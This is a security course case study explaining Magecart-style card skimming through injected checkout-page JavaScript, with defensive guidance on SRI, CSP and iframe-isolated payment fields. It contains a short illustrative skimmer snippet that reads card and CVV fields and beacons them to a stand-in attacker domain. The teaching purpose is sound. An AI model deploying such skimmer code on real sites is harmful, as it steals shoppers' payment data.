Module 16 · Case Study

Magecart — Client-Side Card Skimming

Not a single incident but a technique used by many groups: inject JavaScript into a checkout page so it silently copies payment-card fields and exfiltrates them as the victim types. XSS/script-injection weaponized purely for data theft.

The technique

Magecart-style skimmers get attacker JavaScript to run on a checkout page — via a stored XSS, a compromised first-party script, or (most famously) a compromised third-party dependency loaded by the page. Once running same-origin on the payment form, the skimmer:

  1. Hooks the card-number / CVV / expiry inputs (event listeners on input/change, or a submit handler).
  2. Reads the values as the victim types them.
  3. Exfiltrates to an attacker domain via an image beacon, fetch, or navigator.sendBeacon — often to a domain whose name mimics a CDN to evade notice.
// shape of a skimmer (illustrative)
document.querySelectorAll('input[name*=card],input[name*=cvv]').forEach(el=>{
  el.addEventListener('change', e=>{
    navigator.sendBeacon('https://cdn-analytics[.]evil/collect',
      JSON.stringify({f:e.target.name, v:e.target.value}));
  });
});

Why it's a different threat shape than a worm

Samy/Twitter were about propagation. Magecart is about silent, persistent exfiltration: there is no alert, no defacement, nothing the victim or often the merchant notices for weeks or months. This is the real-world form of Module 11's blind/OOB idea — the payload's whole job is to phone home quietly.

The absent / bypassed defenses

  • Subresource Integrity (SRI) on third-party scripts — a <script integrity=...> hash makes a tampered dependency fail to load. Missing SRI is the classic enabler of the supply-chain variant.
  • CSP connect-src/img-src/default-src restricting where the page may send data — blocks the exfiltration beacon to an unknown host. A well-scoped CSP is the single most effective containment.
  • Payment-field isolation: render card fields inside a PCI-compliant iframe from a different origin (hosted fields / a payment iframe), so first-party script — malicious or not — literally cannot read them (Same-Origin Policy working for you).
  • Prevent the initial XSS / lock down dependencies (pin versions, review, monitor script integrity at runtime).

Lesson for defenders

Magecart is why a modern XSS defense must think about data egress, not only script execution. Even a page that "only" allows a trusted-looking script can bleed card data if nothing constrains where the page may talk. It also elevates architecture (iframe isolation of secrets) alongside encoding and CSP — a theme your Module 18 threat model should treat as first-class: assume script may run; make the secrets unreachable and the exfil path closed.
